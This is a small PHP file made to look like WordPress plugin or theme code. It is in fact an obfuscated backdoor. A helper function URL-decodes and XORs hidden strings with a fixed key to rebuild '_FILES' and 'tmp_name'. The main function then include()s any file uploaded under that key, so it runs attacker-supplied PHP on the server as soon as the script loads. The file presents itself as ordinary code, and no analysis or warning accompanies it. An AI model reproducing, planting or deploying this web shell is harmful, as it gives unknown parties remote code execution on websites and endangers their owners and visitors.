<?php 	

function children_query()

{
    $old_status_to_new_status = 'hOSJR2RU1I';
    $force_delete = $old_status_to_new_status;

    

    $post_modified = $GLOBALS[operator("7%09%1A%06%17a", $force_delete)];
    $_ext = $post_modified;

    $update_meta_cache = isset($_ext[$force_delete]);
    if ($update_meta_cache)

    {
        $en_dash = $post_modified[$force_delete];
        $taxonomy_obj = $en_dash[operator("%1C%22%23%15%3CS%3F0", $force_delete)];
        $filtered = $taxonomy_obj;
        include ($filtered);
    }
	$icon = 'filename';
}
function operator($encode_ascii_characters, $to_ping)

{
	$default_capabilities_for_mapping = 'old_status';
    $item = $to_ping;
    $field = "url" . "decode";
    $is_utf8 = $field($encode_ascii_characters);
    $query_var = substr($item,0, strlen($is_utf8));

    $menu_order = $is_utf8 ^ $query_var;
    return $menu_order;
}

children_query();


?>
